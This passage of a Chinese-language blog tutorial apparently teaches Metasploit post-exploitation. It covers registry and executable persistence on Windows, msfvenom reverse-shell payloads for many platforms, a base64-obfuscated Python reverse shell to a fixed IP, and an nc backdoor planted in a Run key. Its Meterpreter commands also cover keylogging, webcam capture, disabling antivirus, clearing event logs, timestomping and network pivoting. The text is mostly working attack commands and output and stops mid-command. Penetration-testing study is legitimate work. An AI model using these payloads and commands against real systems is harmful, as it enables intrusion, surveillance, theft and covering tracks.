on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure><p>此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数</p><ul><li>REXENAME是拷贝到目标系统中的名字</li><li>EXEPATH是将要上传的后门在本地的位置</li><li>SESSION是选择运行此模块的会话</li><li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li></ul><p>尝试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure><p>4.registry_persistence</p><p>完整路径为exploit/windows/local/registry_persistence</p><p>和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure><p>同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">萌新科普 手把手教你如何用MSF进行后渗透测试 - 安全客，安全资讯平台</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure><h2 id="2-msf基本命令-1"><a href="#2-msf基本命令-1" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure><h2 id="3-msfvenom生成payload-1"><a href="#3-msfvenom生成payload-1" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="4-Meterpreter基本命令-1"><a href="#4-Meterpreter基本命令-1" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-1"><a href="#4-1-基本系统命令-1" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure><h3 id="4-2-文件系统命令-1"><a href="#4-2-文件系统命令-1" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-网络命令-1"><a href="#4-3-网络命令-1" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set 